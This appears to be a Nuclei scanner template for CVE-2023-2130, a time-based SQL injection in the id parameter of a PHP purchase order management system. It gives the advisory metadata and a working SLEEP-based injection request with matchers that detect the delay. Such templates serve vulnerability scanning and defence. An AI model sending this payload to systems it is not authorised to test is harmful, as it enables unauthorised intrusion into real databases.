id: CVE-2023-2130

info:
  name: Purchase Order Management v1.0 - SQL Injection
  author: theamanrawat
  severity: critical
  description: |
    A vulnerability classified as critical has been found in SourceCodester Purchase Order Management System 1.0. Affected is an unknown function of the file /admin/suppliers/view_details.php of the component GET Parameter Handler. The manipulation of the argument id leads to sql injection. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used. VDB-226206 is the identifier assigned to this vulnerability.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to execute arbitrary SQL queries, potentially leading to unauthorized access, data leakage, or data manipulation.
  remediation: |
    Upgrade to the latest version to mitigate this vulnerability.
  reference:
    - https://github.com/zitozito1/bug_report/blob/main/SQLi.md
    - https://www.sourcecodester.com/php/14935/purchase-order-management-system-using-php-free-source-code.html
    - https://nvd.nist.gov/vuln/detail/CVE-2023-2130
    - https://vuldb.com/?ctiid.226206
    - https://vuldb.com/?id.226206
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-2130
    cwe-id: CWE-89
    epss-score: 0.81183
    epss-percentile: 0.99136
    cpe: cpe:2.3:a:purchase_order_management_system_project:purchase_order_management_system:1.0:*:*:*:*:*:*:*
  metadata:
    verified: "true"
    max-request: 1
    vendor: purchase_order_management_system_project
    product: purchase_order_management_system
  tags: time-based-sqli,cve2023,cve,sqli,purchase-order-management-system,purchase_order_management_system_project,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/admin/suppliers/view_details.php?id=1'+AND+(SELECT+9687+FROM+(SELECT(SLEEP(6)))pnac)+AND+'ARHJ'='ARHJ"

    matchers:
      - type: dsl
        dsl:
          - 'duration>=6'
          - 'status_code == 200'
          - 'contains(header, "text/html")'
          - 'contains(body, "Supplier Name")'
        condition: and
# digest: 4a0a00473045022100ecf8ca3199aec29dd0f539921ea1831e24d8ae9c5b6e70330e90b2e4e837f2d9022015613bd4995ac3c1815b84c5e0e7fc9d9586011fc68efd7bd2b40e6cd42f9847:922c64590222798bb761d5b6d8e72950